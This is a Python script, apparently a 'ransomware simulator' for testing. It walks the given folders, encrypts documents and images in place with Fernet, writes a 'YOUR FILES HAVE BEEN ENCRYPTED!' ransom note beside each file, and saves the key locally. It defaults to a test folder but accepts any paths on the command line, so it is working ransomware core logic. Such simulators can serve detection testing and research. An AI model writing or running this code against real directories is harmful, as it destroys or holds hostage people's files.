# ransomware_simulator.py
import os
import time
import json
import base64
import sys
from datetime import datetime
from cryptography.fernet import Fernet


class RansomwareSimulator:
    def __init__(self, target_folders=None, encryption_key=None):
        # Accept single or multiple target folders
        if target_folders is None:
            # Default: use test_files/1
            self.target_folders = [
                os.path.join(
                    os.path.dirname(os.path.abspath(__file__)),
                    "test_files",
                    "1",
                )
            ]
        elif isinstance(target_folders, str):
            # Single path as string
            self.target_folders = [target_folders]
        else:
            # List of paths
            self.target_folders = target_folders
        
        self.key = encryption_key or Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.encrypted_files = []

    def scan_files(self):
        """Scan for target files in all target folders"""
        target_extensions = [".pdf", ".txt", ".docx", ".xlsx", ".jpg", ".png", ".json"]
        files = []

        for target_folder in self.target_folders:
            if not os.path.exists(target_folder):
                print(f"Creating directory: {target_folder}")
                os.makedirs(target_folder, exist_ok=True)
                continue

            for root, dirs, filenames in os.walk(target_folder):
                for filename in filenames:
                    if any(filename.endswith(ext) for ext in target_extensions):
                        files.append(os.path.join(root, filename))

        return files

    def encrypt_file(self, file_path):
        "Encrypt a single file"
        try:
            with open(file_path, "rb") as f:
                original_data = f.read()

            # Encrypt the data
            encrypted_data = self.cipher.encrypt(original_data)

            # Write encrypted data back
            with open(file_path, "wb") as f:
                f.write(encrypted_data)

            # Create ransom note
            ransom_note = f"""
YOUR FILES HAVE BEEN ENCRYPTED!
"""

            ransom_path = file_path + ".README_TO_DECRYPT.txt"
            with open(ransom_path, "w") as f:
                f.write(ransom_note)

            self.encrypted_files.append(file_path)
            print(f"Encrypted: {os.path.basename(file_path)}")

        except Exception as e:
            print(f"Failed to encrypt {file_path}: {e}")

    def run_encryption(self):
        """Encrypt all found files in all target folders"""
        files = self.scan_files()

        if not files:
            print(f"No files found in:")
            for folder in self.target_folders:
                print(f"  - {folder}")
            print("Add some .txt, .pdf, .json, .jpg files to these directories")
            return

        print(f"Target folders: {len(self.target_folders)}")
        for folder in self.target_folders:
            print(f"  - {folder}")
        print(f"Found {len(files)} files to encrypt")

        for file_path in files:
            self.encrypt_file(file_path)

        print(f"Encrypted {len(self.encrypted_files)} files")


    def save_key(self):
        "Save decryption key"
        key_data = {
            "decryption_key": base64.b64encode(self.key).decode(),
            "encrypted_files": self.encrypted_files,
            "timestamp": datetime.now().isoformat(),
        }

        key_path = os.path.join(os.path.dirname(__file__), "decryption_key.json")
        with open(key_path, "w") as f:
            json.dump(key_data, f, indent=2)

        print("Decryption key saved")


def main():
    """
    Usage:
      python ransomware_simulator.py                    # Uses default (test_files/1)
      python ransomware_simulator.py /path/to/folder    # Single path
      python ransomware_simulator.py /path1 /path2 /path3  # Multiple paths
    """
    if len(sys.argv) > 1:
        # User provided paths as arguments
        target_paths = sys.argv[1:]
        print(f"Running ransomware simulator on {len(target_paths)} path(s)...")
        ransomware = RansomwareSimulator(target_folders=target_paths)
    else:
        # Use default path
        print("No paths specified. Using default path (test_files/1)")
        ransomware = RansomwareSimulator()
    
    ransomware.run_encryption()
    ransomware.save_key()


if __name__ == "__main__":
    main()
